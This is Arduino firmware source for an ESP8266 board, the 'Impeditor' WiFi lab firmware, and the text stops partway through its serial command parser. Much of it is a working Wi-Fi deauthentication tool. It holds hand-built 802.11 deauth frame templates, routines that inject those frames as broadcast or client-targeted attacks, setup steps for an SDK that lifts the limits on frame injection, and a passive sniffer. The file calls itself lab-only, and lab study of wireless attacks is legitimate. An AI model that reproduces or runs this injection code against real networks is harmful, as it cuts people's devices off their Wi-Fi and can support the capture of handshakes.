/*
 * ============================================================
 * ESP8266 D1 Mini — WiFi Lab Firmware v9 (Impeditor)
 * For use in a private, legal cybersecurity lab only.
 * ============================================================
 *
 * IMPORTANT — Required SDK
 * ─────────────────────────────────────────────────────────────
 * This firmware MUST be compiled with the Spacehuhn Deauther
 * SDK. The stock ESP8266 Arduino core blocks injection of
 * management frames (deauth/disassoc/beacon) inside
 * wifi_send_pkt_freedom(), which makes it return -1 forever.
 *
 * Setup:
 *   1. Arduino IDE → Preferences → Additional Boards URLs:
 *      https://raw.githubusercontent.com/SpacehuhnTech/arduino/main/package_spacehuhn_index.json
 *   2. Boards Manager → search "deauther" → install
 *      "Deauther ESP8266 Boards"
 *   3. Tools → Board → Deauther ESP8266 Boards →
 *      LOLIN(WEMOS) D1 R2 & mini
 *   4. CPU 80MHz, Flash 4MB, Upload 921600
 * ─────────────────────────────────────────────────────────────
 *
 * LIMITATIONS — what this firmware CAN and CANNOT do
 * ─────────────────────────────────────────────────────────────
 * The ESP8266 in promiscuous mode (even with the Spacehuhn SDK)
 * truncates Data frame payloads. Investigation in v8 showed that
 * Data frames are delivered with only ~36-48 bytes of payload
 * regardless of actual frame size. This is a hardware/firmware
 * limit — not a bug in this code.
 *
 * What works:
 *   ✓ Active scanning (SCAN command → all visible APs)
 *   ✓ Management frame capture: BEACON, PROBE_REQ/RESP,
 *     AUTH, ASSOC_REQ/RESP, DEAUTH, DISASSOC
 *   ✓ Data frame headers: src MAC, dst MAC, RSSI, channel
 *   ✓ Broadcast deauth (DEAUTH)
 *   ✓ Targeted client deauth (CDEAUTH, both directions)
 *
 * What doesn't work on this hardware:
 *   ✗ EAPOL handshake parsing — payloads are truncated before
 *     the EAPOL key data is reached
 *   ✗ PMKID extraction from EAPOL M1 — same root cause
 *   ✗ Any payload-level inspection of Data frames (DHCP, ARP,
 *     EAP types, Beacon vendor IEs beyond ~36 bytes)
 *
 * For payload-level capture (PMKID, full EAPOL handshake,
 * deeper protocol analysis), use:
 *   - An ESP32 (~$5, dual-core, full promiscuous payloads)
 *   - A USB Wi-Fi adapter in monitor mode on a laptop
 *   - A Raspberry Pi with an external Wi-Fi adapter
 *
 * The ESP8266's strength remains injection (where the
 * Spacehuhn-patched SDK shines) and management frame
 * observation. Use it for those, accept the limitation for
 * payload capture.
 * ─────────────────────────────────────────────────────────────
 *
 * Version history:
 *   v9 — Cleanup: removed unreliable EAPOL/PMKID parsing code,
 *        documented hardware limitation. Sniffer now reports
 *        DATA frames as DATA (no further classification attempt).
 *   v8 — Added 8-slot circular sniff ring buffer. Diagnosed the
 *        EAPOL truncation issue via DBG_FRAME diagnostic.
 *   v7 — Added EAPOL/PMKID parsing (later removed in v9 — the
 *        ESP8266 hardware can't deliver the necessary payload).
 *   v6 — Review cleanup: static_assert on RxCtrl size, yield()
 *        at top of loop(), refactored sendCDeauthBurst, unified
 *        command parser pattern, volatile correctness fixes.
 *   v5 — SDK-native scanner via wifi_station_scan(), all radio
 *        control via low-level SDK calls, non-blocking serial,
 *        strict parseMac(), safe string copies.
 *
 * SERIAL PROTOCOL (115200 baud)
 *   PING                                                 → PONG
 *   SCAN                                                 → SCAN_START / {json} / SCAN_END
 *   DEAUTH <AP_MAC> <CH>                                 → broadcast deauth
 *   CDEAUTH <AP_MAC> <CLIENT_MAC> <CH> <REASON> <MODE>   → client-targeted deauth
 *   SNIFF <CH> [BSSID_FILTER]                            → passive sniffer
 *   STOP                                                 → stops any active op
 *
 * CDEAUTH MODE: 0=AP→Client  1=Client→AP  2=Both
 * Reason codes: 1=unspec 2=prev-auth-invalid 3=leaving
 *               6=class2 7=class3 8=disassoc-leaving
 * ============================================================
 */

#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// ─────────────────────────────────────────────────────────────
// CONSTANTS
// ─────────────────────────────────────────────────────────────
const uint32_t SERIAL_BAUD          = 115200;
const uint16_t DEAUTH_INTERVAL      = 100;   // ms between bursts
const uint8_t  DEAUTH_COUNT         = 5;     // frames per burst
const uint8_t  SNIFF_DEDUP_MAX      = 20;
const uint32_t SNIFF_DEDUP_INTERVAL = 5000;
const uint16_t SERIAL_LINE_MAX      = 128;   // max command length


// ─────────────────────────────────────────────────────────────
// STATE — Broadcast deauth
// ─────────────────────────────────────────────────────────────
bool     g_deauthing   = false;
uint8_t  g_targetBSSID[6];
uint8_t  g_targetChannel;
uint32_t g_lastDeauth  = 0;


// ─────────────────────────────────────────────────────────────
// STATE — Client deauth
// ─────────────────────────────────────────────────────────────
bool     g_cDeauthing  = false;
uint8_t  g_cApMac[6];
uint8_t  g_cClientMac[6];
uint8_t  g_cChannel;
uint8_t  g_cReason;
uint8_t  g_cMode;
uint32_t g_lastCDeauth = 0;


// ─────────────────────────────────────────────────────────────
// STATE — Passive sniffer
// ─────────────────────────────────────────────────────────────
bool    g_sniffing      = false;
uint8_t g_sniffChannel;
bool    g_sniffFilterOn = false;
uint8_t g_sniffFilterMac[6];

struct DedupEntry {
  uint8_t  bssid[6];
  uint32_t lastSeen;
  bool     used;
};
DedupEntry g_dedupTable[SNIFF_DEDUP_MAX];

// Custom RxCtrl — replaces wifi_pkt_rx_ctrl_t which was removed
// from newer ESP8266 cores. Layout matches the radio metadata
// the SDK prepends to each promiscuous-mode buffer.
//
// IMPORTANT: This bitfield layout is pinned to the Spacehuhn boards
// package SDK. If you ever update to a different SDK version, the
// static_assert below will fail at compile time if the layout has
// shifted — far better than the sniffer silently producing garbage
// RSSI values.
struct RxCtrl {
  signed   rssi:        8;
  unsigned rate:        4;
  unsigned is_group:    1;
  unsigned _reserved1:  1;
  unsigned sig_mode:    2;
  unsigned legacy_len:  12;
  unsigned damatch0:    1;
  unsigned damatch1:    1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS:         7;
  unsigned CWB:         1;
  unsigned HT_length:   16;
  unsigned Smoothing:   1;
  unsigned Not_Sounding:1;
  unsigned _reserved2:  1;
  unsigned Aggregation: 1;
  unsigned STBC:        2;
  unsigned FEC_CODING:  1;
  unsigned SGI:         1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt:   8;
  unsigned channel:     4;
  unsigned _reserved3:  12;
};
static_assert(sizeof(RxCtrl) == 12,
              "RxCtrl bitfield layout changed — check SDK version");

// Sniffer circular buffer.
//
// The ISR (snifferCallback) writes records into g_sniffRing[head],
// then advances head. Main loop reads from g_sniffRing[tail], prints,
// then advances tail. This decouples ISR write rate from serial
// transmit rate — short bursts (e.g. EAPOL 4-way handshake completing
// in ~50-200ms) no longer get dropped just because main loop happens
// to be mid-print when a frame arrives.
//
// Slot count is power of 2 so we can use & SNIFF_RING_MASK instead of
// % SNIFF_RING_SIZE in the ISR — saves a divide instruction per frame.
//
// Concurrency:
//   head = written by ISR only,         read by main loop only
//   tail = written by main loop only,   read by ISR only
//   Single-byte writes are atomic on Xtensa LX106. No locking needed.
//
//   The ISR writes the slot contents first, then advances head last.
//   Main loop sees a stable slot once head moves past it — read order
//   matches write order. Same model TCP segment reorder buffers use.
//
// Drop policy: when the ring is full (head + 1 == tail), the ISR
// drops the incoming frame and increments g_sniffDrops. Main loop
// can print the drop count periodically to surface buffer pressure.
#define SNIFF_RING_SIZE  8
#define SNIFF_RING_MASK  (SNIFF_RING_SIZE - 1)

struct SniffRecord {
  char    type[14];
  uint8_t src[6];
  uint8_t dst[6];
  int8_t  rssi;
  char    extra[52];
};

SniffRecord        g_sniffRing[SNIFF_RING_SIZE];
volatile uint8_t   g_sniffHead    = 0;   // ISR writes here
volatile uint8_t   g_sniffTail    = 0;   // main loop reads here
volatile uint16_t  g_sniffDrops   = 0;   // count of frames dropped due to full ring


// ─────────────────────────────────────────────────────────────
// STATE — Non-blocking serial reader
// ─────────────────────────────────────────────────────────────
char     g_lineBuf[SERIAL_LINE_MAX + 1];
uint16_t g_lineLen = 0;


// ─────────────────────────────────────────────────────────────
// FRAME TEMPLATES — 26 bytes each
//   [0-1]   Frame Control (0xC0 0x00 = deauth)
//   [2-3]   Duration
//   [4-9]   Destination
//   [10-15] Source
//   [16-21] BSSID
//   [22-23] Sequence (managed by hw)
//   [24-25] Reason code (LE uint16)
// ─────────────────────────────────────────────────────────────

uint8_t g_deauthFrame[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Dst: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Src: AP   (runtime)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP (runtime)
  0x00, 0x00,
  0x01, 0x00
};

uint8_t g_cDeauthAtoC[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Dst: Client
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Src: AP
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP
  0x00, 0x00,
  0x01, 0x00
};

uint8_t g_cDeauthCtoA[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Dst: AP
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Src: Client
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP
  0x00, 0x00,
  0x01, 0x00
};


// ─────────────────────────────────────────────────────────────
// FORWARD DECLARATIONS
// ─────────────────────────────────────────────────────────────
void stopDeauth();
void stopCDeauth();
void stopSniffer();
void ICACHE_RAM_ATTR snifferCallback(uint8_t* buf, uint16_t len);
void handleCommand(const String& raw);


// ─────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────

/*
 * parseMac()
 * Strict MAC parser — accepts ONLY "XX:XX:XX:XX:XX:XX" (17 chars,
 * hex digits, colons in the right places). Rejects malformed input
 * instead of silently producing zero bytes.
 */
bool parseMac(const String& s, uint8_t* out) {
  if (s.length() != 17) return false;
  for (int i = 0; i < 17; i++) {
    char c = s[i];
    if (i % 3 == 2) {
      if (c != ':') return false;
    } else {
      if (!isxdigit((unsigned char)c)) return false;
    }
  }
  for (int i = 0; i < 6; i++) {
    out[i] = (uint8_t) strtol(s.substring(i * 3, i * 3 + 2).c_str(),
                              nullptr, 16);
  }
  return true;
}

String macToString(const uint8_t* mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

/*
 * safeCopy()
 * Always-null-terminated copy. Replaces strncpy which leaves out
 * unterminated when source ≥ outLen.
 */
void safeCopy(char* out, uint8_t outLen, const char* src) {
  if (outLen == 0) return;
  uint8_t i = 0;
  while (i < outLen - 1 && src[i] != '\0') {
    out[i] = src[i];
    i++;
  }
  out[i] = '\0';
}

void stopAll() {
  if (g_deauthing)  stopDeauth();
  if (g_cDeauthing) stopCDeauth();
  if (g_sniffing)   stopSniffer();
}

/*
 * radioReturnToIdle()
 * Cleans up after any active engine. All state changes go through
 * the low-level SDK — never WiFi.mode() — to stay compatible with
 * the patched Spacehuhn SDK.
 */
void radioReturnToIdle() {
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(nullptr);
  wifi_station_disconnect();
  wifi_set_opmode_current(STATION_MODE);
}

/*
 * radioPrepInjection()
 * Puts the radio into the exact state required by the SDK for
 * wifi_send_pkt_freedom() to accept management-frame packets.
 *
 * Sequence (matters!):
 *   1. Disconnect station, kill any auto-reconnect attempts
 *   2. Set STATION mode (only mode that allows tx via freedom)
 *   3. Disable promiscuous mode first (resets internal state)
 *   4. Pause briefly so the radio settles
 *   5. Set channel (must be done while NOT promiscuous)
 *   6. Re-enable promiscuous mode
 *   7. Verify channel — if wrong, set again
 */
void radioPrepInjection(uint8_t channel) {
  wifi_station_disconnect();
  wifi_station_set_auto_connect(0);
  wifi_set_opmode_current(STATION_MODE);

  wifi_promiscuous_enable(0);
  // Let SDK finish its mode-switch state machine before sending more
  // commands. Without this delay, the upcoming wifi_set_channel() call
  // is sometimes silently ignored.
  delay(10);

  wifi_set_channel(channel);
  // wifi_set_channel() returns instantly but the radio PHY needs a
  // few milliseconds to actually retune. Channel commands sent before
  // this settles can land on the previous channel.
  delay(10);

  wifi_promiscuous_enable(1);
  // Final settle. Belt-and-suspenders before the first injection —
  // promiscuous-enable triggers internal buffer setup and the first
  // wifi_send_pkt_freedom() can fail if it races this setup.
  delay(10);

  uint8_t actual = wifi_get_channel();
  if (actual != channel) {
    wifi_set_channel(channel);
    delay(5);
    actual = wifi_get_channel();
  }

  Serial.print("RADIO_READY ch_req:");
  Serial.print(channel);
  Serial.print(" ch_actual:");
  Serial.print(actual);
  Serial.print(" mode:");
  Serial.println(wifi_get_opmode());
}


// ─────────────────────────────────────────────────────────────
// WIFI SCANNER (SDK-native — required for Spacehuhn SDK)
// ─────────────────────────────────────────────────────────────
//
// We don't use WiFi.scanNetworks() because the Spacehuhn-patched
// SDK is unstable when called via the high-level Arduino API
// after the radio has been in injection mode. Calling
// wifi_station_scan() directly avoids the crash.
//
// Map from SDK auth_mode → 'enc' value. Matches what
// WiFi.encryptionType() returned in earlier versions, so the
// Android side does not need any change.

static int scanEncMap(uint8_t auth) {
  switch (auth) {
    case AUTH_OPEN:           return 0;
    case AUTH_WEP:            return 5;
    case AUTH_WPA_PSK:        return 2;
    case AUTH_WPA2_PSK:       return 4;
    case AUTH_WPA_WPA2_PSK:   return 4;   // mixed → WPA2
    default:                  return 7;   // enterprise / unknown
  }
}

void scanDoneCb(void* arg, STATUS status) {
  if (status != OK) {
    Serial.println("SCAN_NONE");
    Serial.println("SCAN_END");
    return;
  }

  bss_info* bss = (bss_info*) arg;
  bool any = false;

  while (bss != nullptr) {
    any = true;

    // bss->ssid is up to 32 bytes, may not be null-terminated
    uint8_t slen = (bss->ssid_len < 32) ? bss->ssid_len : 32;

    // Sanitise non-printable + escape quotes/backslash inline
    char ssidEsc[66];
    uint8_t j = 0;
    for (uint8_t i = 0; i < slen && j < 64; i++) {
      char c = (char) bss->ssid[i];
      if (c == '"' || c == '\\') {
        ssidEsc[j++] = '\\';
        if (j < 65) ssidEsc[j++] = c;
      } else if (c < 0x20 || c > 0x7E) {
        ssidEsc[j++] = '?';
      } else {
        ssidEsc[j++] = c;
      }
    }
    ssidEsc[j] = '\0';

    Serial.print("{\"ssid\":\"");
    Serial.print(ssidEsc);
    Serial.print("\",\"bssid\":\"");
    Serial.print(macToString(bss->bssid));
    Serial.print("\",\"ch\":");
    Serial.print(bss->channel);
    Serial.print(",\"rssi\":");
    Serial.print(bss->rssi);
    Serial.print(",\"enc\":");
    Serial.print(scanEncMap(bss->authmode));
    Serial.println("}");

    bss = STAILQ_NEXT(bss, next);
  }

  if (!any) Serial.println("SCAN_NONE");
  Serial.println("SCAN_END");
}

void doScan() {
  stopAll();
  delay(50);

  Serial.println("SCAN_START");

  // Clean radio state — required after injection/promiscuous use
  radioReturnToIdle();
  delay(20);

  scan_config cfg;
  memset(&cfg, 0, sizeof(cfg));
  cfg.ssid        = nullptr;   // any
  cfg.bssid       = nullptr;   // any
  cfg.channel     = 0;         // all channels
  cfg.show_hidden = 1;

  if (!wifi_station_scan(&cfg, scanDoneCb)) {
    Serial.println("SCAN_NONE");
    Serial.println("SCAN_END");
  }
  // scanDoneCb will print results + SCAN_END asynchronously
}


// ─────────────────────────────────────────────────────────────
// BROADCAST DEAUTH ENGINE
// ─────────────────────────────────────────────────────────────
void startDeauth(uint8_t* bssid, uint8_t channel) {
  memcpy(g_targetBSSID, bssid, 6);
  g_targetChannel = channel;

  // Patch frame: Src and BSSID = AP MAC
  memcpy(&g_deauthFrame[10], bssid, 6);
  memcpy(&g_deauthFrame[16], bssid, 6);

  radioPrepInjection(channel);

  g_deauthing  = true;
  g_lastDeauth = 0;

  Serial.print("DEAUTH_START ");
  Serial.print(macToString(bssid));
  Serial.print(" CH");
  Serial.println(channel);
}

void stopDeauth() {
  g_deauthing = false;
  radioReturnToIdle();
  Serial.println("DEAUTH_STOP");
}

void sendDeauthBurst() {
  digitalWrite(LED_BUILTIN, LOW);

  int firstResult  = 0;
  int successCount = 0;

  for (uint8_t i = 0; i < DEAUTH_COUNT; i++) {
    int r = wifi_send_pkt_freedom(g_deauthFrame, sizeof(g_deauthFrame), 0);
    if (i == 0) firstResult = r;
    if (r == 0) successCount++;
    delay(1);
  }

  digitalWrite(LED_BUILTIN, HIGH);

  Serial.print("TX result: ");
  Serial.print(firstResult);
  Serial.print(" ok:");
  Serial.print(successCount);
  Serial.print("/");
  Serial.println(DEAUTH_COUNT);
}


// ─────────────────────────────────────────────────────────────
// CLIENT DEAUTH ENGINE
// ─────────────────────────────────────────────────────────────
void buildCDeauthFrames(uint8_t* apMac, uint8_t* clientMac, uint8_t reason) {
  // AP → Client
  memcpy(&g_cDeauthAtoC[4],  clientMac, 6);
  memcpy(&g_cDeauthAtoC[10], apMac,     6);
  memcpy(&g_cDeauthAtoC[16], apMac,     6);
  g_cDeauthAtoC[24] = reason;
  g_cDeauthAtoC[25] = 0x00;

  // Client → AP
  memcpy(&g_cDeauthCtoA[4],  apMac,     6);
  memcpy(&g_cDeauthCtoA[10], clientMac, 6);
  memcpy(&g_cDeauthCtoA[16], apMac,     6);
  g_cDeauthCtoA[24] = reason;
  g_cDeauthCtoA[25] = 0x00;
}

void startCDeauth(uint8_t* apMac, uint8_t* clientMac,
                  uint8_t channel, uint8_t reason, uint8_t mode) {
  memcpy(g_cApMac,     apMac,     6);
  memcpy(g_cClientMac, clientMac, 6);
  g_cChannel = channel;
  g_cReason  = reason;
  g_cMode    = mode;

  buildCDeauthFrames(apMac, clientMac, reason);
  radioPrepInjection(channel);

  g_cDeauthing  = true;
  g_lastCDeauth = 0;

  const char* modeStr[] = {"AP->CLIENT", "CLIENT->AP", "BOTH"};
  Serial.print("CDEAUTH_START AP:");
  Serial.print(macToString(apMac));
  Serial.print(" CLIENT:");
  Serial.print(macToString(clientMac));
  Serial.print(" CH:");
  Serial.print(channel);
  Serial.print(" REASON:");
  Serial.print(reason);
  Serial.print(" MODE:");
  Serial.println(modeStr[mode]);
}

void stopCDeauth() {
  g_cDeauthing = false;
  radioReturnToIdle();
  Serial.println("CDEAUTH_STOP");
}

/**
 * Fires DEAUTH_COUNT copies of one frame, returns how many succeeded.
 * Used by sendCDeauthBurst() — splitting the per-direction logic out
 * here avoids the messy first-result tracking that was confusing when
 * both directions fired in one burst.
 */
int sendCDeauthDirection(uint8_t* frame, size_t frameSize) {
  int success = 0;
  for (uint8_t i = 0; i < DEAUTH_COUNT; i++) {
    if (wifi_send_pkt_freedom(frame, frameSize, 0) == 0) success++;
    delay(1);
  }
  return success;
}

void sendCDeauthBurst() {
  digitalWrite(LED_BUILTIN, LOW);

  int sentAtoC = 0, okAtoC = 0;
  int sentCtoA = 0, okCtoA = 0;

  if (g_cMode == 0 || g_cMode == 2) {
    okAtoC   = sendCDeauthDirection(g_cDeauthAtoC, sizeof(g_cDeauthAtoC));
    sentAtoC = DEAUTH_COUNT;
    Serial.print("CDEAUTH_TX AP->CLIENT CLIENT:");
    Serial.print(macToString(g_cClientMac));
    Serial.print(" ok:");
    Serial.print(okAtoC);
    Serial.print("/");
    Serial.println(sentAtoC);
  }

  if (g_cMode == 1 || g_cMode == 2) {
    okCtoA   = sendCDeauthDirection(g_cDeauthCtoA, sizeof(g_cDeauthCtoA));
    sentCtoA = DEAUTH_COUNT;
    Serial.print("CDEAUTH_TX CLIENT->AP AP:");
    Serial.print(macToString(g_cApMac));
    Serial.print(" ok:");
    Serial.print(okCtoA);
    Serial.print("/");
    Serial.println(sentCtoA);
  }

  digitalWrite(LED_BUILTIN, HIGH);
}


// ─────────────────────────────────────────────────────────────
// PASSIVE SNIFFER ENGINE
// ─────────────────────────────────────────────────────────────
bool shouldReportBeacon(const uint8_t* bssid) {
  uint32_t now = millis();
  int freeSlot = -1;

  for (int i = 0; i < SNIFF_DEDUP_MAX; i++) {
    if (!g_dedupTable[i].used) {
      if (freeSlot == -1) freeSlot = i;
      continue;
    }
    if (memcmp(g_dedupTable[i].bssid, bssid, 6) == 0) {
      if (now - g_dedupTable[i].lastSeen < SNIFF_DEDUP_INTERVAL) return false;
      g_dedupTable[i].lastSeen = now;
      return true;
    }
  }

  if (freeSlot != -1) {
    memcpy(g_dedupTable[freeSlot].bssid, bssid, 6);
    g_dedupTable[freeSlot].lastSeen = now;
    g_dedupTable[freeSlot].used     = true;
  }
  return true;
}

bool extractSSID(const uint8_t* frame, uint16_t len, char* out, uint8_t outLen) {
  if (outLen == 0) return false;

  uint16_t offset = 24;
  while (offset + 2 < len) {
    uint8_t tagId  = frame[offset];
    uint8_t tagLen = frame[offset + 1];

    if (tagId == 0) {
      if (tagLen == 0) {
        safeCopy(out, outLen, "<hidden>");
        return true;
      }
      uint8_t copyLen = (tagLen < (outLen - 1)) ? tagLen : (outLen - 1);
      memcpy(out, &frame[offset + 2], copyLen);
      out[copyLen] = '\0';
      for (uint8_t i = 0; i < copyLen; i++) {
        if (out[i] < 0x20 || out[i] > 0x7E) out[i] = '?';
      }
      return true;
    }

    if (tagLen == 0) break;
    offset += 2 + tagLen;
  }
  return false;
}


bool passFilter(const uint8_t* src, const uint8_t* dst) {
  if (!g_sniffFilterOn) return true;
  return (memcmp(src, g_sniffFilterMac, 6) == 0 ||
          memcmp(dst, g_sniffFilterMac, 6) == 0);
}

void ICACHE_RAM_ATTR snifferCallback(uint8_t* buf, uint16_t len) {
  uint16_t hdrLen = sizeof(RxCtrl);
  if (len < hdrLen + 24) return;

  // Check if the ring is full. If head+1 wraps to tail, we have no
  // free slot — drop this frame and bump the counter so main loop can
  // surface buffer pressure to the operator.
  uint8_t nextHead = (g_sniffHead + 1) & SNIFF_RING_MASK;
  if (nextHead == g_sniffTail) {
    g_sniffDrops++;
    return;
  }

  // Get the current free slot. We'll write into it, then advance
  // g_sniffHead at the very end. Until head moves, main loop won't
  // see this slot — so we don't need any locking here.
  SniffRecord* slot = &g_sniffRing[g_sniffHead];

  RxCtrl*   ctrl  = (RxCtrl*) buf;
  uint8_t*  frame = buf + hdrLen;
  uint16_t  flen  = len - hdrLen;

  uint8_t frameType    = (frame[0] >> 2) & 0x03;
  uint8_t frameSubtype = (frame[0] >> 4) & 0x0F;

  uint8_t* dst   = &frame[4];
  uint8_t* src   = &frame[10];
  uint8_t* bssid = &frame[16];

  if (!passFilter(src, dst)) return;

  int8_t rssi = ctrl->rssi;

  if (frameType == 0x00) {
    switch (frameSubtype) {
      case 0x08: {   // Beacon
        if (!shouldReportBeacon(bssid)) return;
        safeCopy(slot->type, sizeof(slot->type), "BEACON");
        char ssid[33] = {0};
        if (extractSSID(frame, flen, ssid, sizeof(ssid)))
          snprintf(slot->extra, sizeof(slot->extra), "SSID:%s", ssid);
        else
          slot->extra[0] = '\0';
        break;
      }
      case 0x04: {   // Probe Request
        safeCopy(slot->type, sizeof(slot->type), "PROBE_REQ");
        char ssid[33] = {0};
        if (extractSSID(frame, flen, ssid, sizeof(ssid)))
          snprintf(slot->extra, sizeof(slot->extra), "SSID:%s", ssid);
        else
          safeCopy(slot->extra, sizeof(slot->extra), "SSID:<wildcard>");
        break;
      }
      case 0x05: {   // Probe Response
        safeCopy(slot->type, sizeof(slot->type), "PROBE_RESP");
        char ssid[33] = {0};
        extractSSID(frame, flen, ssid, sizeof(ssid));
        snprintf(slot->extra, sizeof(slot->extra), "SSID:%s", ssid);
        break;
      }
      case 0x0B:    // Authentication
        safeCopy(slot->type, sizeof(slot->type), "AUTH");
        slot->extra[0] = '\0';
        break;
      case 0x00:    // Association Request
        safeCopy(slot->type, sizeof(slot->type), "ASSOC_REQ");
        slot->extra[0] = '\0';
        break;
      case 0x01:    // Association Response
        safeCopy(slot->type, sizeof(slot->type), "ASSOC_RESP");
        slot->extra[0] = '\0';
        break;
      case 0x0A:    // Disassociation
        safeCopy(slot->type, sizeof(slot->type), "DISASSOC");
        if (flen >= 26) {
          uint16_t reason = frame[24] | (frame[25] << 8);
          snprintf(slot->extra, sizeof(slot->extra), "REASON:%u", reason);
        } else slot->extra[0] = '\0';
        break;
      case 0x0C:    // Deauthentication
        safeCopy(slot->type, sizeof(slot->type), "DEAUTH");
        if (flen >= 26) {
          uint16_t reason = frame[24] | (frame[25] << 8);
          snprintf(slot->extra, sizeof(slot->extra), "REASON:%u", reason);
        } else slot->extra[0] = '\0';
        break;
      default:
        return;
    }
  }
  else if (frameType == 0x02) {
    // Data frame.
    //
    // We deliberately do NOT attempt EAPOL/PMKID extraction here.
    // The Spacehuhn promiscuous mode on ESP8266 truncates Data
    // frame payloads in a way that makes payload parsing unreliable
    // (see LIMITATIONS in the file header). For payload-level
    // capture, use an ESP32 or USB monitor adapter instead.
    safeCopy(slot->type, sizeof(slot->type), "DATA");
    slot->extra[0] = '\0';
  }
  else {
    return;
  }

  memcpy(slot->src, src, 6);
  memcpy(slot->dst, dst, 6);
  slot->rssi  = rssi;

  // Publish: advance head so main loop can see this slot.
  // This MUST be the last write — everything above must be visible
  // to main loop by the time it observes the new head value.
  // On ESP8266 (single core, in-order writes from this CPU's
  // perspective), a plain assignment to g_sniffHead is sufficient.
  g_sniffHead = nextHead;
}

void startSniffer(uint8_t channel, uint8_t* filterMac) {
  g_sniffChannel = channel;

  // Reset ring buffer state. We do this BEFORE enabling promiscuous
  // mode so the ISR can never see stale indices. Drops counter resets
  // too — it's per-session, not cumulative across runs.
  g_sniffHead  = 0;
  g_sniffTail  = 0;
  g_sniffDrops = 0;

  memset(g_dedupTable, 0, sizeof(g_dedupTable));

  if (filterMac != nullptr) {
    g_sniffFilterOn = true;
    memcpy(g_sniffFilterMac, filterMac, 6);
  } else {
    g_sniffFilterOn = false;
  }

  wifi_station_disconnect();
  wifi_set_opmode_current(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(snifferCallback);
  wifi_set_channel(channel);
  wifi_promiscuous_enable(1);

  g_sniffing = true;

  Serial.print("SNIFF_START CH:");
  Serial.print(channel);
  if (g_sniffFilterOn) {
    Serial.print(" FILTER:");
    Serial.print(macToString(g_sniffFilterMac));
  }
  Serial.println();
}

void stopSniffer() {
  g_sniffing = false;
  radioReturnToIdle();
  Serial.println("SNIFF_STOP");
}

void printSniffRecord(const SniffRecord* rec) {
  Serial.print("SNIFF ");
  Serial.print(rec->type);
  Serial.print(" ");
  Serial.print(macToString((uint8_t*)rec->src));
  Serial.print(" ");
  Serial.print(macToString((uint8_t*)rec->dst));
  Serial.print(" CH:");
  Serial.print(g_sniffChannel);
  Serial.print(" RSSI:");
  Serial.print(rec->rssi);
  if (rec->extra[0] != '\0') {
    Serial.print(" ");
    Serial.print(rec->extra);
  }
  Serial.println();
}


// ─────────────────────────────────────────────────────────────
// SERIAL COMMAND PARSER
// ─────────────────────────────────────────────────────────────
void handleCommand(const String& raw) {
  String cmd = raw;
  cmd.trim();
  if (cmd.length() == 0) return;

  if (cmd == "PING") {
    Serial.println("PONG");
    return;
  }

  if (cmd == "STOP") {
    if      (g_deauthing)  stopDeauth();
    else if (g_cDeauthing) stopCDeauth();
    else if (g_sniffing)   stopSniffer();
    else                   Serial.println("INFO idle");
    return;
  }

  if (cmd == "SCAN") {
    doScan();
    return;
  }

  if (cmd.startsWith("DEAUTH ") && !cmd.startsWith("CDEAUTH")) {
    // Tokenize: "DEAUTH <AP_MAC> <CH>"
    String tokens[3];
    int    tokenCount = 0;
    int    start      = 0;

    for (int i = 0; i <= (int)cmd.length() && tokenCount < 3; i++) {
      if (i == (int)cmd.length() || cmd[i] == ' ') {
        if (i > start) tokens[tokenCount++] = cmd.substring(start, i);
        start = i + 1;
      }
    }

    if (tokenCount != 3) {
      Serial.println("ERR bad_format. Expected: DEAUTH <AP_MAC> <CH>");
      return;
    }

    uint8_t bssid[6];
    if (!parseMac(tokens[1], bssid)) { Serial.println("ERR bad_mac");     return; }
    long ch = tokens[2].toInt();
    if (ch < 1 || ch > 14)           { Serial.println("ERR bad_channel"); return; }

    stopAll();
    startDeauth(bssid, (uint8_t)ch);
    return;
  }

  if (cmd.startsWith("CDEAUTH ")) {
    String tokens[6];
    int    tokenCount = 0;
    int    start      = 0;

    for (int i = 0; i <= (int)cmd.length() && tokenCount < 6; i++) {
      if (i == (int)cmd.length() || cmd[i] == ' ') {
        if (i > start) tokens[tokenCount++] = cmd.substring(start, i);
        start = i + 1;
      }
    }

    if (tokenCount != 6) {
      Serial.println("ERR bad_format. Expected: CDEAUTH <AP_MAC> <CLIENT_MAC> <CH> <REASON> <MODE>");
      return;
    }

    uint8_t apMac[6], clientMac[6];
    if (!parseMac(tokens[1], apMac))     { Serial.println("ERR bad_ap_mac");     return; }
    if (!parseMac(tokens[2], clientMac)) { Serial.println("ERR bad_client_mac"); return; }

    long ch     = tokens[3].toInt();
    long reason = tokens[4].toInt();
    long mode   = tokens[5].toInt();

    if (ch < 1 || ch > 14)          { Serial.println("ERR bad_channel"); return; }
    if (reason < 1 || reason > 255) { Serial.println("ERR bad_reason");  return; }
    if (mode < 0 || mode > 2)       { Serial.println("ERR bad_mode");    return; }

    stopAll();
    startCDeauth(apMac, clientMac, (uint8_t)ch, (uint8_t)reason, (uint8_t)mode);
    return;
  }

  if (cmd.startsWith("SNIFF ")) {
    // Tokenize: "SNIFF <CH> [BSSID_FILTER]"  — 2 or 3 tokens
    String tokens[3];
    int    tokenCount = 0;
    int    start      = 0;

    for (int i = 0; i <= (int)cmd.length() && tokenCount < 3; i++) {
      if (i == (int)cmd.length() || cmd[i] == ' ') {
        if (i > start) tokens[tokenCount++] = cmd.substring(start, i);
